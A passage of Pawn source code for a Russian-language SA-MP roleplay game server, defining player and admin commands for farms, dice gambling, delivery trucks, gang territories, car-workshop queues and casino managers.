	return true;
}
CMD:taxigps(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || PlayerInfo[playerid][pJob] != 4) return SCM(playerid, COLOR_GREY, " Вы не таксист или не на службе");
	new null[7];
	foreach(i)
	{
		if(Works[i]) null[0]++;
		if(Prorab[i]) null[1]++;
		if(GetPVarInt(i,"farm_id") == 1) null[2]++;
		if(GetPVarInt(i,"farm_id") == 2) null[3]++;
		if(GetPVarInt(i,"farm_id") == 3) null[4]++;
		if(GetPVarInt(i,"farm_id") == 4) null[5]++;
		if(GetPVarInt(i,"farm_id") == 5) null[6]++;
	}
	format(string,sizeof(string),"{ffffff}[Грузчики] {33AA33} Прорабов %i Рабочих %i\n\
						{ffffff}[Ферма №0] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №1] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №2] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №3] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №4] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$",
	null[1], null[0], null[2], FarmInfo[1][fZp], null[3], FarmInfo[2][fZp], null[4], FarmInfo[3][fZp], null[5], FarmInfo[4][fZp], null[6], FarmInfo[5][fZp]);
	return ShowPlayerDialogEx(playerid, 1344, DIALOG_STYLE_LIST, "Статистика",string, "GPS", "Закрыть");
}
CMD:farmstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /farmstats [номер фермы]");
	if(params[0] < 0 || params[0] > 4) return SCM(playerid, COLOR_GREY, " Ошибка: Неверный номер фермы.");
	FarmStats(playerid,params[0]);
	return 1;
}
CMD:dice(playerid, params[])
{
	if(!PlayerToPoint(30.0,playerid,1130.7448,-1.4491,1000.6797)) return SCM(playerid, -1, " Вы должны находиться в казино!");
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /dice [ID] [ставка]");
	if(params[1] < 100 || params[1] > 1000000) return SCM(playerid, -1, " Минимальная ставка 100$ максимальная 1 000 000$");
	if(ZapretDice[params[0]] == 1) return SCM(playerid, -1, " В данный момент игрок не может играть!");
	if(PlayerInfo[params[0]][pCash] < params[1]) return SCM(playerid, -1, " У этого игрока нет столько денег!");
	if(dicetime > gettime()) return SCM(playerid, -1, " В данный момент вы не можете играть!");
	if(!IsPlayerConnected(params[0])) return true;    if(!ProxDetectorS(6.0, playerid, params[0])) return true;
	if(params[0] == playerid) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s бросить кости. Ставка: $%i",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает бросить кости. Ставка: $%i",Name(playerid),params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SCM(params[0], -1, " Нажмите {48FC23}Y {FFFFFF}чтобы согласиться {FF0000}N {FFFFFF}для отказа");
	ZapretDice[playerid] = 1;
	KostiName[params[0]] = playerid;
	KostiMoney[params[0]] = params[1];
	DiceOffers[playerid] = params[0];
	return true;
}
CMD:farm(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /farm [номер фермы]");
	if(params[0] < 0 || params[0] > 4) return SCM(playerid, -1, " Ошибка: Неверный номер фермы.");
	switch(params[0])
	{
	case 0:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-376.9641,-1437.9998,25.7266);
			}
			else return SetPlayerPos(playerid,-376.9641,-1437.9998,25.7266);
		}
	case 1:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-103.2208,-29.6182,3.1172);
			}
			else return SetPlayerPos(playerid,-103.2208,-29.6182,3.1172);
		}
	case 2:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-1033.3143,-1166.2423,129.2188);
			}
			else return SetPlayerPos(playerid,-1033.3143,-1166.2423,129.2188);
		}
	case 3:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-2.8795,88.8511,3.1172);
			}
			else return SetPlayerPos(playerid,-2.8795,88.8511,3.1172);
		}
	case 4:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),1904.1216,174.0404,37.1664);
			}
			else return SetPlayerPos(playerid,1904.1216,174.0404,37.1664);
		}
	}
	return true;
}
CMD:prodmenu(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Вы должны устроиться на работу развозчика продуктов");
	if(GetPlayerVehicleID(playerid) >= comptruck[0] && GetPlayerVehicleID(playerid) <= comptruck[1])
	{
		if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
		return ShowPlayerDialogEx(playerid, 1322, DIALOG_STYLE_LIST, "Развозка продуктов", "Покупка зерна\nПродажа зерна\nПокупка урожая\nПродажа урожая", "Выбрать", "Отмена");
	}
	else if(GetPlayerVehicleID(playerid) >= comptruck[2] && GetPlayerVehicleID(playerid) <=  comptruck[3]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка бензина", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[4] && GetPlayerVehicleID(playerid) <=  comptruck[5]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[6] && GetPlayerVehicleID(playerid) <=  comptruck[7]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[8] && GetPlayerVehicleID(playerid) <=  comptruck[9]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	return true;
}
CMD:funload(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 2 || (GetPlayerVehicleID(playerid) != FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0] && GetPlayerVehicleID(playerid) != FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1])) return SCM(playerid,COLOR_GREY," [Ошибка] Вы не работаете на этой ферме / не в спец транспорте / не у фермы");
	if(!IsPlayerInRangeOfPoint(playerid,20.0,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0],FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1],FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return SCM(playerid,COLOR_GREY," [Ошибка] Вы не работаете на этой ферме / не в спец транспорте / не у фермы");
	if(FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] >= 10000) return SCM(playerid, COLOR_GREY," Склад полон!");
	if(!Farmcar_prods[GetPlayerVehicleID(playerid)]) return SCM(playerid,COLOR_GREY," В грузовике нет урожая");
	SetPVarInt(playerid,"farm_zp", GetPVarInt(playerid,"farm_zp") + Farmcar_prods[GetPlayerVehicleID(playerid)]*10/2);
	format(string, 32, "~b~count:~w~%i$",GetPVarInt(playerid,"farm_zp"));
	FarmStatPay[GetPVarInt(playerid,"farm_id")][3] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	FarmStatDay[GetPVarInt(playerid,"farm_id")][3] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	GameTextForPlayer(playerid, string, 3000, 1);
	FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	if(FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] >= 10000) FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] = 10000;
	Farmcar_prods[GetPlayerVehicleID(playerid)] = 0;
	format(string, sizeof(string), " {00AB06}Урожая в машине: 0 / 1000");
	SCM(playerid, COLOR_GREEN,string);
	//DeletePVar(playerid,"farm_status");
	return true;
}
CMD:fpanel(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 3) return true;
	if(!PlayerToPoint(13, playerid,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return SCM(playerid,-1,"{B8B8B8} Поблизости нет ферм");
	format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
	format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
	return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
}
CMD:finfo(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	for(new i = 0; i <= TOTALFARM; i++)
	{
		if(!PlayerToPoint(10, playerid,FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) continue;
		return FarmStats(playerid,i);
	}
	return SCM(playerid,-1,"{B8B8B8} Поблизости нет ферм");
}
CMD:ffixcar(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 2) return true;
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]);
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]);
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fCombine]);
	if(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]] > 0) Delete3DTextLabel(Farmcar_text[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]]), DestroyDynamicPickup(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]]), Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]] = 0;
	if(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]] > 0) Delete3DTextLabel(Farmcar_text[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]]), DestroyDynamicPickup(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]]), Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]] = 0;
	return true;
}
CMD:finvite(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 3) return true;
	if(!PlayerToPoint(10, playerid,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return true;
	if(sscanf(params, "iii",params[0],params[1],params[2]))
	{
		SCM(playerid, -1, " Введите: /finvite [playerid (-1 для увольнения)] [тип] [место (от 1)]");
		return SCM(playerid,-1," Тип: 1 - заместитель | 2 - фермер");
	}
	if(params[0] != -1 && PlayerInfo[params[0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
	switch(params[1])
	{
	case 1:
		{
			if(GetPVarInt(playerid,"farm_rank") < 4) return SCM(playerid,COLOR_GREY," Вы не можете нанимать заместителей");
			if(params[2] == 1)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_1],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_1],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 2)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_2],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_2],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 3)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_3],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_3],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else return SCM(playerid,COLOR_GREY," Неверное значение");
			SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность заместителя", PlayerInfo[params[0]][pName]);
			printf("Игрок %s принял %і на должность заместителя фермы №%i", Name(playerid), Name(params[0]), GetPVarInt(playerid, "farm_id"));
		}
	case 2:
		{
			if(params[2] == 1)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_1],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_1],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 2)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_2],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_2],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 3)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_3],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_3],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 4)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_4],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_4],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else if(params[2] == 5)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_5],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_5],PlayerInfo[params[0]][pName], 0, strlen(PlayerInfo[params[0]][pName]), 32);
			}
			else return SCM(playerid,COLOR_GREY," Неверное значение");
			SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность фермера", PlayerInfo[params[0]][pName]);
			printf("Игрок %s принял %і на должность фермера фермы №%i", Name(playerid), Name(params[0]), GetPVarInt(playerid, "farm_id"));
		}
	}
	return true;
}
CMD:gmap(playerid, params[])
{
    ClearTotalGz();
    for(new y = 0; y < sizeof(GZInfo); y++)
	{
	    if(GZInfo[y][gFrakVlad] == 12) TotalGzB++;
	    if(GZInfo[y][gFrakVlad] == 13) TotalGzV++;
	    if(GZInfo[y][gFrakVlad] == 15) TotalGzG++;
	    if(GZInfo[y][gFrakVlad] == 17) TotalGzA++;
	    if(GZInfo[y][gFrakVlad] == 18) TotalGzR++;
    }
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Rifa: %d",TotalGzR);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Grove street: %d",TotalGzG);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Ballas: %d",TotalGzB);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Vagos: %d",TotalGzV);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Aztec: %d",TotalGzA);
	return 1;
}
CMD:tpanel(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || !WGet(playerid)) return true;
	new i = GetPVarInt(playerid,"wShop");
	if(!PlayerToPoint(15, playerid,WorkshopInfo[i][wEntr][0],WorkshopInfo[i][wEntr][1],WorkshopInfo[i][wEntr][2]) && !PlayerToPoint(15, playerid,WorkshopInfo[i][wExit][0],WorkshopInfo[i][wExit][1],WorkshopInfo[i][wExit][2])) return SCM(playerid, -1, "{B8B8B8} Поблизости нет автомастерских");
	return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
	\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
}
CMD:tinfo(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(!PlayerToPoint(3, playerid,WorkshopInfo[i][wEntr][0x0], WorkshopInfo[i][wEntr][0x1], WorkshopInfo[i][wEntr][0x2])) continue;
		return WorkshopStats(playerid,i);
	}
	return SCM(playerid,-1,"{B8B8B8} Поблизости нет автомастерских");
}
CMD:tupdate(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(!GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," [Ошибка] Функция недоступна");
	if(!PlayerToPoint(10, playerid,1067.3966,2128.3901,10.5110)) return SCM(playerid,COLOR_GREY, " Вы должны находиться в гараже автомастерской");
	if(GetPVarInt(playerid,"installation") != 0) return SCM(playerid,COLOR_GREY," Вы не установили деталь!");
	//if(!ProxDetectorS(8.0, playerid, GetPVarInt(playerid,"installation_")) return SCM(playerid, COLOR_GREY, "Человек не рядом с вами!");
	if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") != GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY,"Игрок не находится с вами в гараже!");
	return ShowDetals(playerid,GetPVarInt(playerid,"installation_"),GetPVarInt(playerid,"Workshop"));
}
CMD:endtune(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(!GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Вы не работаете в автомастерской!");
	if(!PlayerToPoint(10, playerid,1067.3966,2128.3901,10.5110)) return SCM(playerid,COLOR_GREY, " Вы должны находиться в гараже автомастерской");
	if(GetPVarInt(playerid,"installation") != 0) return SCM(playerid,COLOR_GREY," Вы не установили деталь!");
	if(!ProxDetectorS(8.0, playerid, GetPVarInt(playerid,"installation_"))) return SCM(playerid, COLOR_GREY, " Человек не рядом с вами!");
	if(!IsPlayerInAnyVehicle(GetPVarInt(playerid,"installation_"))) return SCM(playerid,COLOR_GREY," Игрок должен находиться в автомобиле");
	if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") != GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Игрок не находится в гараже!");
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,-1," Вы должны находиться в автомобиле");
	SetPlayerVirtualWorld(playerid,0);
	SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
	SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
	SetVehiclePos(GetPlayerVehicleID(playerid),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
	DeletePVar(GetPVarInt(playerid,"installation_"),"cost");
	DeletePVar(GetPVarInt(playerid,"installation_"),"prods");
	DeletePVar(GetPVarInt(playerid,"installation_"),"detals");
	DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
	DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
	SaveTuning(GetPVarInt(playerid,"installation_"),CarInfo[GetPVarInt(playerid,"installation_")][carColor_two][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")]);
	DeletePVar(playerid,"installation");
	DeletePVar(GetPVarInt(playerid,"installation_"),"mechanic");
	new x = GetPVarInt(playerid,"Workshop");
	for(new x_ = 0; x_ < 9; x_++)
	{
		WorkshopList[x_][x][wlID] = WorkshopList[x_+1][x][wlID];
		strmid(WorkshopList[x_][x][wlName],WorkshopList[x_+1][x][wlName],0,strlen(WorkshopList[x_+1][x][wlName]), MAX_PLAYER_NAME);
		WorkshopList[x_+1][x][wlID] = -1;
		strmid(WorkshopList[x_+1][x][wlName],"", 0, strlen(""), 5);
	}
	if(WorkshopList[0][x][wlID] != -1 && strlen(WorkshopList[0][x][wlName]))
	{
		SCM(WorkshopList[0][x][wlID],COLOR_BLUE,"Подошла ваша очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
		SetPVarInt(WorkshopList[0][x][wlID],"w_time", gettime() + 120);
		SetPlayerCheckpoint(WorkshopList[0][x][wlID],WorkshopInfo[x][wMenu][0],WorkshopInfo[x][wMenu][1],WorkshopInfo[x][wMenu][2], 10.0);
	}
	DeletePVar(GetPVarInt(playerid,"installation_"),"w_time");
	DeletePVar(GetPVarInt(playerid,"installation_"),"w_id");
	DeletePVar(GetPVarInt(playerid,"installation_"),"InWorkshop");
	return DeletePVar(playerid,"installation_");
}
CMD:addtunnequeue(playerid, params[])
{
	if(PlayerInfo[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Workshop")) return true;
	if(GetPVarInt(playerid,"Workshop__") < 2) return SCM(playerid,COLOR_GREY," Вы не можете добавлять в очередь");
	if(!PlayerToPoint(10, playerid,1496.0302,1308.6653,1093.2892)) return SCM(playerid,-1, " Необходимо находиться в автомастерской");
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /addtunnequeue [id]");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	new null = -1, null_ = 0;
	for(new i = 9; i >= 0; i--)
	{
		if(!strlen(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName])) null = i;
		if(strcmp(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName],PlayerInfo[params[0]][pName],true) == 0 && strlen(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName])) null_++;
	}
	if(null == -1) return SCM(playerid,COLOR_GREY," Очередь заполнена!");
	if(null_ > 0) return SCM(playerid,COLOR_GREY," Игрок уже ждет свою очередь!");
	SetPVarInt(params[0], "w_id",GetPVarInt(playerid,"Workshop"));
	WorkshopList[null][GetPVarInt(playerid,"Workshop")][wlID] = params[0];
	strmid(WorkshopList[null][GetPVarInt(playerid,"Workshop")][wlName],PlayerInfo[params[0]][pName],0,strlen(PlayerInfo[params[0]][pName]), 32);
	SendMes(playerid,COLOR_BLUE," Вы добавили игрока %s в очередь!", PlayerInfo[params[0]][pName]);
	if(null == 0)
	{
		SetPVarInt(params[0], "w_time", gettime() + 120);
		SCM(params[0],COLOR_BLUE," Механик добавил вас в очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
		SetPlayerCheckpoint(params[0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2], 10.0);
	}
	else SCM(params[0],COLOR_BLUE," Механик добавил вас в очередь");
	return true;
}
/*CMD:setmemgroup(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || PlayerInfo[playerid][pLeader] != 4) return true;
	if(sscanf(params, "ud", params[0x0],params[0x1]) || params[0x1] < 0 || params[0x1] > 3 || params[0x0] == playerid) return SCM(playerid, -1," Введите: /setmemgroup [playerid] [подразделение]"), SCM(playerid, -1, "0. LS | 1. SF | 2. LV");
	if(PlayerInfo[params[0x0]][pMember] != 4) return SCM(playerid,COLOR_GREY,"Данный игрок не состоит в МЧС");
	new null[0x5];
	if(params[0x1] == 0) null = "LS";
	else if(params[0x1] == 1) null = "SF";
	else if(params[0x1] == 2) null = "LV";
	SendMes(params[0x0],COLOR_BLUE,"%s назначил вас контролировать участок МЧС %s!",PlayerInfo[playerid][pName],null);
	SendMes(playerid,COLOR_BLUE," Вы назначили %s контролировать участок МЧС %s!",PlayerInfo[params[0x0]][pName],null);
	PlayerInfo[params[0x0]][pRank] = 9;
	PlayerInfo[params[0x0]][pJobHeal] = params[0x1];
	return true;
}*/
CMD:slimit(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || IsANoLimiter(playerid)) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_GREY, " Необходимо быть зарулём!");
	if(PlayerInfo[playerid][pDrivingSkill] > 1 && PlayerInfo[playerid][pAdmin] <= 0) return SCM(playerid,COLOR_GREY," Ваш навык недостаточно высок!");
	switch(PlayerInfo[playerid][pDrivingSkill])
	{
	case 0: PlayerInfo[playerid][pDrivingSkill] = 1, PlayerTextDrawSetString(playerid,LimitShow[playerid],"~r~MAX");
	case 1: PlayerInfo[playerid][pDrivingSkill] = 0, PlayerTextDrawSetString(playerid,LimitShow[playerid],"MAX");
	}
	return true;
}
CMD:setcasinoowner(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || PlayerInfo[playerid][pAdmin] < 5) return true;
	if(sscanf(params, "dd",params[0x0], params[0x1])) return SCM(playerid, -1, " Введите: /setcasinoowner [id мафии] (6 - Yakuza | 5 - LCN | 14 - Russian Mafia) [id казино 1 - 4 dragons | 0 - caligula]");
	if(params[0x0] != 6 && params[0x0] < 0 && params[0x0] != 5 && params[0x0] != 14) return SCM(playerid,COLOR_GREY," Неверный ид");
	CasinoInfo[params[0x1]][caMafia] = params[0x0];
	printf("Администратор %s установил владельцем казино[%i] %i", Name(playerid), params[1], params[0]);
	return SCM(playerid,-1," Успешно! (/cinfo)");
}
CMD:setmng(playerid, params[])
{
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		if(PlayerInfo[playerid][pMember] != CasinoInfo[i][caMafia] || PlayerInfo[playerid][pRank] < 9) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
		if(sscanf(params, "ii",params[0x0],params[0x1]) || (params[0x0] == playerid && params[0x0] > -1)) return SCM(playerid, -1, " Введите: /setmng [playerid или -1] [слот 0 - 2]");
		if(params[0x0] > -1 && PlayerInfo[params[0x0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
		switch(params[0x1])
		{
		case 0:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 1:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager2],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager2],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		case 2:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager3],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager3],PlayerInfo[params[0x0]][pName], 0, strlen(PlayerInfo[params[0x0]][pName]), 32);
			}
		default: return SCM(playerid,COLOR_GREY," Неверный слот!");
		}
		SendMes(params[0x0], COLOR_BLUE, " %s назначил вас Менеджером казино [%i]",PlayerInfo[playerid][pName],params[0x1]);
		SendMes(playerid, COLOR_BLUE, " Вы назначили %s Менеджером казино [%i]",PlayerInfo[params[0x0]][pName],params[0x1]);
		printf("Игрок %s назначил %s менеджером[%i] казино №%i", Name(playerid), Name(params[0]), params[1], i);
	}
	return true;
}
CMD:cinvite(playerid, params[])
{
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		if(GetPVarInt(playerid,"CasinoRank") != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
